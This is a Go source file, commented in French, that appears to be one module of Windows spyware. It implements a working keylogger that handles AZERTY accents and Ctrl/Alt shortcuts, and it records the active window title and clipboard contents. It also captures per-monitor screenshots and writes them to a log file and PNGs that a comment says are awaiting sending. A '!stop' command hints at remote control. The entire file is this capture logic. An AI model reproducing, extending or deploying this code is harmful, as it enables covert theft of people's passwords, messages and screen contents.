// Capture clavier, presse-papiers et fenêtre active, plus captures d'écran.
//
// Le clavier est lu avec GetAsyncKeyState + ToUnicode : la conversion passe
// par la disposition clavier réellement installée (AZERTY comprise) et par
// l'état des touches de modification, donc les accents français sortent
// correctement.
package main

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	procGetAsyncKeyState = user32DLL.NewProc("GetAsyncKeyState")
	procGetKeyboardState = user32DLL.NewProc("GetKeyboardState")
	procMapVirtualKey    = user32DLL.NewProc("MapVirtualKeyW")
	procToUnicode        = user32DLL.NewProc("ToUnicode")
	procGetForegroundWin = user32DLL.NewProc("GetForegroundWindow")
	procGetWindowTextW   = user32DLL.NewProc("GetWindowTextW")
	procIsClipAvail      = user32DLL.NewProc("IsClipboardFormatAvailable")
	procOpenClipboard    = user32DLL.NewProc("OpenClipboard")
	procCloseClipboard   = user32DLL.NewProc("CloseClipboard")
	procGetClipboardData = user32DLL.NewProc("GetClipboardData")
	procGlobalLock       = kernel32DLL.NewProc("GlobalLock")
	procGlobalUnlock     = kernel32DLL.NewProc("GlobalUnlock")
)

const cfUnicodeText = 13

var (
	klMu       sync.Mutex
	klBuf      strings.Builder
	klLastWin  string
	klLastClip string
)

/* ------------------------------------------------------------------ */
/* Fenêtre active                                                      */
/* ------------------------------------------------------------------ */

func foregroundTitle() string {
	hwnd, _, _ := procGetForegroundWin.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 512)
	n, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if n == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

/* ------------------------------------------------------------------ */
/* Presse-papiers                                                      */
/* ------------------------------------------------------------------ */

func clipboardText() string {
	avail, _, _ := procIsClipAvail.Call(cfUnicodeText)
	if avail == 0 {
		return ""
	}
	// Plusieurs tentatives : le presse-papiers est volé par d'autres
	// processus pendant quelques millisecondes.
	for i := 0; i < 5; i++ {
		if ok, _, _ := procOpenClipboard.Call(0); ok == 0 {
			time.Sleep(15 * time.Millisecond)
			continue
		}
		h, _, _ := procGetClipboardData.Call(cfUnicodeText)
		if h == 0 {
			procCloseClipboard.Call()
			return ""
		}
		p, _, _ := procGlobalLock.Call(h)
		if p == 0 {
			procCloseClipboard.Call()
			return ""
		}
		var out []uint16
		// unsafe.Add pour l'arithmétique de pointeur : la forme convertissant
		// un uintptr calculé en unsafe.Pointer est refusée par go vet.
		base := uptr(p)
		for i := 0; i < 32768; i++ {
			c := *(*uint16)(unsafe.Add(base, i*2))
			if c == 0 {
				break
			}
			out = append(out, c)
		}
		procGlobalUnlock.Call(h)
		procCloseClipboard.Call()
		return syscall.UTF16ToString(out)
	}
	return ""
}

/* ------------------------------------------------------------------ */
/* Clavier                                                             */
/* ------------------------------------------------------------------ */

// specialKey rend les touches non imprimables lisibles.
func specialKey(vk uintptr) (string, bool) {
	switch vk {
	case 0x08:
		return "[BKSP]", true
	case 0x09:
		return "[TAB]", true
	case 0x0D:
		return "[ENTER]\n", true
	case 0x1B:
		return "[ESC]", true
	case 0x20:
		return " ", true
	case 0x2D:
		return "[INS]", true
	case 0x2E:
		return "[DEL]", true
	case 0x25:
		return "[←]", true
	case 0x26:
		return "[↑]", true
	case 0x27:
		return "[→]", true
	case 0x28:
		return "[↓]", true
	case 0x5B, 0x5C:
		return "[WIN]", true
	}
	if vk >= 0x70 && vk <= 0x7B { // F1..F12
		return fmt.Sprintf("[F%d]", vk-0x6F), true
	}
	return "", false
}

// vkToText convertit un code virtuel en texte, via la disposition réelle.
func vkToText(vk uintptr) string {
	if s, ok := specialKey(vk); ok {
		return s
	}
	// 0x01..0x1B couvre les touches de contrôle ; on ignore le reste de la
	// plage sauf les caractères imprimables.
	if vk < 0x20 {
		return ""
	}

	kb := make([]byte, 256)
	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&kb[0])))

	scan, _, _ := procMapVirtualKey.Call(vk, 0) // MAPVK_VK_TO_VSC
	buf := make([]uint16, 8)
	r, _, _ := procToUnicode.Call(vk, scan, uintptr(unsafe.Pointer(&kb[0])),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), 0)
	if r <= 0 {
		// Touches non imprimables ou acc mort : on note le nom de la touche.
		if vk >= 0x20 && vk <= 0x6E {
			return fmt.Sprintf("[%s]", syscall.UTF16ToString([]uint16{uint16(vk)}))
		}
		return ""
	}
	return syscall.UTF16ToString(buf[:r])
}

// keyHeld dit si une touche virtuelle est enfoncée (état asynchrone).
func keyHeld(vk uintptr) bool {
	cur, _, _ := procGetAsyncKeyState.Call(vk)
	return byte(cur>>8)&0x80 != 0
}

// keylogLoop tourne en continu : c'est le processus qui lit l'état des
// touches, pas une tâche périodique. Chaque marque est horodatée et une
// reprise après plus de 20 s d'inactivité ouvre une nouvelle ligne : sans
// cela, le journal est un pavé illisible. Les raccourcis Ctrl/Alt sont
// notés comme [CTRL+c] plutôt que par la lettre seule.
func keylogLoop() {
	prev := make([]byte, 256)
	first := true
	var lastKey time.Time

	for {
		time.Sleep(30 * time.Millisecond)

		// !stop : on vide le tampon puis on rend la main.
		if stopped.Load() {
			klFlushNow()
			return
		}
		// Fenêtre active : on marque le changement.
		if t := foregroundTitle(); t != "" && t != klLastWin {
			klLastWin = t
			klAppend("\n[win " + time.Now().Format("15:04:05") + "] " + t + "\n")
		}

		ctrl := keyHeld(0x11)
		alt := keyHeld(0x12)

		for vk := uintptr(1); vk < 256; vk++ {
			cur, _, _ := procGetAsyncKeyState.Call(vk)
			pressed := byte(cur>>8) & 0x80
			if pressed == 0 {
				prev[vk] = 0
				continue
			}
			if prev[vk] != 0 { // maintenue : on n'écrit qu'au premier appui
				continue
			}
			prev[vk] = pressed
			if first {
				// Premier tour : on ignore l'état déjà présent à l'ouverture,
				// sinon la touche enfoncée au lancement part tout seule.
				continue
			}
			if vk == 0x10 || vk == 0x11 || vk == 0x12 || vk == 0x14 || // shift/ctrl/alt/caps
				vk == 0x90 || vk == 0x91 { // numlock / scrolllock
				continue
			}
			if t := vkToText(vk); t != "" {
				now := time.Now()
				if lastKey.IsZero() || now.Sub(lastKey) > 20*time.Second {
					klAppend("\n[" + now.Format("15:04:05") + "] ")
				}
				lastKey = now
				if ctrl || alt {
					mod := "CTRL"
					if alt {
						mod = "ALT"
					}
					klAppend("[" + mod + "+" + strings.Trim(t, "[]") + "]")
				} else {
					klAppend(t)
				}
			}
		}
		first = false

		// Presse-papiers : on note une seule fois chaque nouvelle valeur.
		if c := clipboardText(); c != "" && c != klLastClip && len(c) < 4000 {
			klLastClip = c
			klAppend("\n[CLIP " + time.Now().Format("15:04:05") + "] " +
				strings.ReplaceAll(c, "\r", "") + "\n")
		}
	}
}

func klAppend(s string) {
	if s == "" {
		return
	}
	klMu.Lock()
	if klBuf.Len() > 256*1024 {
		// Le tampon mémoire ne grossit pas au-delà d'un quart de méga : au
		//-delà on pousse sur le disque.
		klMu.Unlock()
		klFlushNow()
		klMu.Lock()
	}
	klBuf.WriteString(s)
	klMu.Unlock()
}

// keylogFlush écrit sur disque ce qui a été saisi depuis le dernier appel.
func keylogFlush() {
	klFlushNow()
	trimFile(workPath("kl.log"), cfg.MaxLogKB)
}

func klFlushNow() {
	klMu.Lock()
	if klBuf.Len() == 0 {
		klMu.Unlock()
		return
	}
	chunk := klBuf.String()
	klBuf.Reset()
	klMu.Unlock()

	f, err := os.OpenFile(workPath("kl.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	_, _ = f.WriteString(chunk)
	f.Close()
}

/* ------------------------------------------------------------------ */
/* Captures d'écran                                                    */
/* ------------------------------------------------------------------ */

var (
	shotMu  sync.Mutex
	shotSeq int
)

// shotList liste les captures en attente d'envoi.
func shotList() []string {
	shotMu.Lock()
	defer shotMu.Unlock()
	var out []string
	entries, err := os.ReadDir(workDir())
	if err != nil {
		return out
	}
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".png") {
			out = append(out, filepathJoin(workDir(), e.Name()))
		}
	}
	return out
}

func filepathJoin(a, b string) string {
	return a + string(os.PathSeparator) + b
}

// screenshotFlush prend une capture par écran et l'écrit dans le dossier de
// travail : chaque moniteur a son fichier (shot-…-01.png, -02.png, …).
func screenshotFlush() {
	shots := captureScreensPNG()
	if len(shots) == 0 {
		return
	}
	shotMu.Lock()
	defer shotMu.Unlock()
	stamp := time.Now().Format("060102-150405")
	for i, data := range shots {
		if len(data) == 0 {
			continue
		}
		shotSeq++
		name := fmt.Sprintf("shot-%s-%02d.png", stamp, shotSeq)
		path := filepathJoin(workDir(), name)
		if err := os.WriteFile(path, data, 0600); err != nil {
			plog("capture: écriture impossible " + err.Error())
			continue
		}
		plog(fmt.Sprintf("capture: %s (écran %d/%d)", name, i+1, len(shots)))
	}
}
